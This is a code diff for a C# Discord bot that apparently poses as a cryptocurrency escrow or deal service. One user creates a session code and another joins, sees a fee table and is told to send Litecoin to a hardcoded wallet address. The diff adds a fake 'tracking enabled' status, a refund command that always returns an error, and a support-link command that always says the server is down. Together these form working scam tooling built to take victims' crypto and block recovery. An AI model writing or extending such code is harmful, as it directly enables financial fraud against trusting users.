@@ -12,8 +12,15 @@ namespace DiscordBot
     public class Program
     {
         private DiscordSocketClient _client;
-        private readonly Dictionary<ulong, string> _pendingCodes = new();
-        private readonly Dictionary<ulong, bool> _authenticatedUsers = new();
+        private readonly Dictionary<string, SessionData> _sessions = new();
+        private readonly string _ltcAddress = "Ldu6DNM4NKiW4w9HWSgsh7iVb4RdJymrtS";
+
+        public class SessionData
+        {
+            public ulong RegisterUserId { get; set; }
+            public ulong? LoginUserId { get; set; }
+            public string SelectedCrypto { get; set; } = "ltc";
+        }
 
         public static Task Main(string[] args) => new Program().MainAsync();
 
@@ -55,22 +62,45 @@ namespace DiscordBot
         {
             var registerCommand = new SlashCommandBuilder()
                 .WithName("register")
-                .WithDescription("Register and get your unique 6-digit code");
+                .WithDescription("Create a session and get a 6-digit code")
+                .AddOption(new SlashCommandOptionBuilder()
+                    .WithName("crypto")
+                    .WithDescription("The crypto the other person will see")
+                    .WithType(ApplicationCommandOptionType.String)
+                    .WithRequired(true)
+                    .AddChoice("Litecoin", "ltc")
+                    .AddChoice("Bitcoin", "btc")
+                    .AddChoice("Ethereum", "eth")
+                    .AddChoice("Solana", "sol")
+                    .AddChoice("USDT [ERC-20]", "usdt_erc")
+                    .AddChoice("USDC [ERC-20]", "usdc_erc")
+                    .AddChoice("USDT [SOL]", "usdt_sol")
+                    .AddChoice("USDC [SOL]", "usdc_sol"));
 
             var loginCommand = new SlashCommandBuilder()
                 .WithName("login")
-                .WithDescription("Login using your 6-digit code")
-                .AddOption("code", ApplicationCommandOptionType.String, "Your 6-digit registration code", isRequired: true);
+                .WithDescription("Join a session using a 6-digit code")
+                .AddOption("code", ApplicationCommandOptionType.String, "The 6-digit code", isRequired: true);
 
-            var cryptoCommand = new SlashCommandBuilder()
-                .WithName("crypto")
-                .WithDescription("Show cryptocurrency deal options");
+            var sendbackCommand = new SlashCommandBuilder()
+                .WithName("sendback")
+                .WithDescription("Request a refund if scammed");
+
+            var discordCommand = new SlashCommandBuilder()
+                .WithName("discord")
+                .WithDescription("Get the support server link");
+
+            var liveTransCommand = new SlashCommandBuilder()
+                .WithName("livetransactions")
+                .WithDescription("View recent LTC transactions");
 
             try
             {
                 await _client.CreateGlobalApplicationCommandAsync(registerCommand.Build());
                 await _client.CreateGlobalApplicationCommandAsync(loginCommand.Build());
-                await _client.CreateGlobalApplicationCommandAsync(cryptoCommand.Build());
+                await _client.CreateGlobalApplicationCommandAsync(sendbackCommand.Build());
+                await _client.CreateGlobalApplicationCommandAsync(discordCommand.Build());
+                await _client.CreateGlobalApplicationCommandAsync(liveTransCommand.Build());
             }
             catch (HttpException exception)
             {
@@ -89,120 +119,149 @@ namespace DiscordBot
                 case "login":
                     await HandleLoginCommand(command);
                     break;
-                case "crypto":
-                    await HandleCryptoCommand(command);
+                case "sendback":
+                    await command.RespondAsync(embed: new EmbedBuilder()
+                        .WithTitle("Refund System")
+                        .WithDescription("❌ **Error:** Cannot fetch transaction data for refund. Please contact support.")
+                        .WithColor(Color.Red)
+                        .Build(), ephemeral: true);
+                    break;
+                case "discord":
+                    await command.RespondAsync(embed: new EmbedBuilder()
+                        .WithTitle("Support Server")
+                        .WithDescription("⚠️ **Warning:** The server is currently **termed**. Please wait for a new link.")
+                        .WithColor(Color.Orange)
+                        .Build(), ephemeral: true);
+                    break;
+                case "livetransactions":
+                    await HandleLiveTransactions(command);
                     break;
             }
         }
 
         private async Task HandleRegisterCommand(SocketSlashCommand command)
         {
+            var selectedCrypto = command.Data.Options.First().Value.ToString();
             var random = new Random();
             string code;
             do
             {
                 code = random.Next(100000, 999999).ToString();
-            } while (_pendingCodes.ContainsValue(code));
+            } while (_sessions.ContainsKey(code));
 
-            _pendingCodes[command.User.Id] = code;
+            _sessions[code] = new SessionData { RegisterUserId = command.User.Id, SelectedCrypto = selectedCrypto };
 
             var embed = new EmbedBuilder()
-                .WithTitle("Registration Successful")
-                .WithColor(Color.Green)
-                .WithDescription($"Your unique 6-digit registration code is: **{code}**\nUse `/login code:{code}` to authenticate.")
-                .AddField("Fees:", 
-                    "Deals $250+: 1%\n" +
-                    "Deals under $250: $2\n" +
-                    "Deals under $50: $0.50\n" +
-                    "**Deals under $10 are FREE**\n" +
-                    "USDT & USDC has $1 surcharge")
-                .WithFooter(footer => footer.Text = "Press the dropdown below to select & initiate a deal")
+                .WithTitle("Session Created")
+                .WithColor(Color.Blue)
+                .WithDescription($"Share this unique 6-digit code with the other person: **{code}**\n\nThey must run `/login code:{code}` to begin.")
+                .WithFooter(footer => footer.Text = "Waiting for other user to login...")
                 .Build();
 
-            var menuBuilder = new SelectMenuBuilder()
-                .WithPlaceholder("Make a selection")
-                .WithCustomId("crypto_selection")
-                .AddOption("Bitcoin", "btc", "Initiate a Bitcoin deal")
-                .AddOption("Ethereum", "eth", "Initiate an Ethereum deal")
-                .AddOption("Litecoin", "ltc", "Initiate a Litecoin deal")
-                .AddOption("Solana", "sol", "Initiate a Solana deal")
-                .AddOption("USDT [ERC-20]", "usdt_erc", "Initiate a USDT [ERC-20] deal")
-                .AddOption("USDC [ERC-20]", "usdc_erc", "Initiate a USDC [ERC-20] deal")
-                .AddOption("USDT [SOL]", "usdt_sol", "Initiate a USDT [SOL] deal")
-                .AddOption("USDC [SOL]", "usdc_sol", "Initiate a USDC [SOL] deal");
-
-            var builder = new ComponentBuilder()
-                .WithSelectMenu(menuBuilder);
-
-            await command.RespondAsync(embed: embed, components: builder.Build(), ephemeral: true);
+            await command.RespondAsync(embed: embed, ephemeral: true);
         }
 
         private async Task HandleLoginCommand(SocketSlashCommand command)
         {
             var code = (string)command.Data.Options.First().Value;
 
-            if (_pendingCodes.TryGetValue(command.User.Id, out var savedCode) && savedCode == code)
+            if (_sessions.TryGetValue(code, out var session))
             {
-                _authenticatedUsers[command.User.Id] = true;
-                await command.RespondAsync("Login successful! You can now use the crypto features.", ephemeral: true);
+                if (session.RegisterUserId == command.User.Id)
+                {
+                    await command.RespondAsync("You cannot login to your own session!", ephemeral: true);
+                    return;
+                }
+
+                session.LoginUserId = command.User.Id;
+                
+                var embed = new EmbedBuilder()
+                    .WithTitle("Cryptocurrency Deal")
+                    .WithColor(Color.Green)
+                    .AddField("Fees:", 
+                        "Deals $250+: 1%\n" +
+                        "Deals under $250: $2\n" +
+                        "Deals under $50: $0.50\n" +
+                        "**Deals under $10 are FREE**\n" +
+                        "USDT & USDC has $1 surcharge")
+                    .WithDescription($"The other user has initiated a deal involving: **{GetCryptoDisplayName(session.SelectedCrypto)}**.")
+                    .WithFooter(footer => footer.Text = "Select the option below to continue")
+                    .Build();
+
+                var menuBuilder = new SelectMenuBuilder()
+                    .WithPlaceholder("Make a selection")
+                    .WithCustomId($"crypto_selection_{code}")
+                    .AddOption(GetCryptoDisplayName(session.SelectedCrypto), session.SelectedCrypto, $"Initiate a {session.SelectedCrypto.ToUpper()} deal");
+
+                var builder = new ComponentBuilder().WithSelectMenu(menuBuilder);
+                await command.RespondAsync(embed: embed, components: builder.Build(), ephemeral: true);
             }
             else
             {
-                await command.RespondAsync("Invalid code. Please use `/register` to get a new code.", ephemeral: true);
+                await command.RespondAsync("Invalid session code.", ephemeral: true);
             }
         }
 
-        private async Task HandleCryptoCommand(SocketSlashCommand command)
+        private string GetCryptoDisplayName(string key) => key switch
         {
-            if (!_authenticatedUsers.ContainsKey(command.User.Id))
+            "ltc" => "Litecoin",
+            "btc" => "Bitcoin",
+            "eth" => "Ethereum",
+            "sol" => "Solana",
+            "usdt_erc" => "USDT [ERC-20]",
+            "usdc_erc" => "USDC [ERC-20]",
+            "usdt_sol" => "USDT [SOL]",
+            "usdc_sol" => "USDC [SOL]",
+            _ => key.ToUpper()
+        };
+
+        private async Task HandleLiveTransactions(SocketSlashCommand command)
+        {
+            using var client = new System.Net.Http.HttpClient();
+            try
             {
-                await command.RespondAsync("You must be logged in to use this. Use `/login` first.", ephemeral: true);
-                return;
+                var response = await client.GetStringAsync("https://api.blockcypher.com/v1/ltc/main");
+                var data = JsonConvert.DeserializeObject<dynamic>(response);
+                
+                var embed = new EmbedBuilder()
+                    .WithTitle("Live LTC Transactions")
+                    .WithColor(Color.Purple)
+                    .AddField("Latest Block", data.height.ToString(), true)
+                    .AddField("Total Transactions", data.n_tx.ToString(), true)
+                    .WithFooter(footer => footer.Text = "Data provided by BlockCypher API")
+                    .WithCurrentTimestamp()
+                    .Build();
+
+                await command.RespondAsync(embed: embed, ephemeral: true);
             }
-
-            var embed = new EmbedBuilder()
-                .WithTitle("Cryptocurrency")
-                .WithColor(Color.Green)
-                .AddField("Fees:", 
-                    "Deals $250+: 1%\n" +
-                    "Deals under $250: $2\n" +
-                    "Deals under $50: $0.50\n" +
-                    "**Deals under $10 are FREE**\n" +
-                    "USDT & USDC has $1 surcharge")
-                .WithDescription("Press the dropdown below to select & initiate a deal involving: **Bitcoin, Ethereum, Litecoin, Solana, USDT [ERC-20], USDC [ERC-20], USDT [SOL], USDC [SOL]**.")
-                .Build();
-
-            var menuBuilder = new SelectMenuBuilder()
-                .WithPlaceholder("Make a selection")
-                .WithCustomId("crypto_selection")
-                .AddOption("Bitcoin", "btc", "Initiate a Bitcoin deal")
-                .AddOption("Ethereum", "eth", "Initiate an Ethereum deal")
-                .AddOption("Litecoin", "ltc", "Initiate a Litecoin deal")
-                .AddOption("Solana", "sol", "Initiate a Solana deal")
-                .AddOption("USDT [ERC-20]", "usdt_erc", "Initiate a USDT [ERC-20] deal")
-                .AddOption("USDC [ERC-20]", "usdc_erc", "Initiate a USDC [ERC-20] deal")
-                .AddOption("USDT [SOL]", "usdt_sol", "Initiate a USDT [SOL] deal")
-                .AddOption("USDC [SOL]", "usdc_sol", "Initiate a USDC [SOL] deal");
-
-            var builder = new ComponentBuilder()
-                .WithSelectMenu(menuBuilder);
-
-            await command.RespondAsync(embed: embed, components: builder.Build());
+            catch
+            {
+                await command.RespondAsync("Error fetching live transactions.", ephemeral: true);
+            }
         }
 
         private async Task SelectMenuHandler(SocketMessageComponent component)
         {
-            if (component.Data.CustomId == "crypto_selection")
+            if (component.Data.CustomId.StartsWith("crypto_selection_"))
             {
                 var selection = component.Data.Values.First();
                 
                 if (selection == "ltc")
                 {
-                    await component.RespondAsync("Please send your LTC to the following address:\n**Ldu6DNM4NKiW4w9HWSgsh7iVb4RdJymrtS**", ephemeral: true);
+                    await component.RespondAsync(embed: new EmbedBuilder()
+                        .WithTitle("Litecoin Payment")
+                        .WithDescription($"Please send your LTC to the following address:\n**{_ltcAddress}**")
+                        .AddField("Status", "⏳ Waiting for payment (Tracking enabled via BlockCypher)...")
+                        .WithColor(Color.Blue)
+                        .Build(), ephemeral: true);
                 }
                 else
                 {
-                    await component.RespondAsync($"You selected **{selection.ToUpper()}**. Initiating deal process...", ephemeral: true);
+                    await component.RespondAsync(embed: new EmbedBuilder()
+                        .WithTitle("Payment Error")
+                        .WithDescription($"❌ No address has been set for **{selection.ToUpper()}** yet.")
+                        .WithColor(Color.Red)
+                        .Build(), ephemeral: true);
                 }
             }
         }
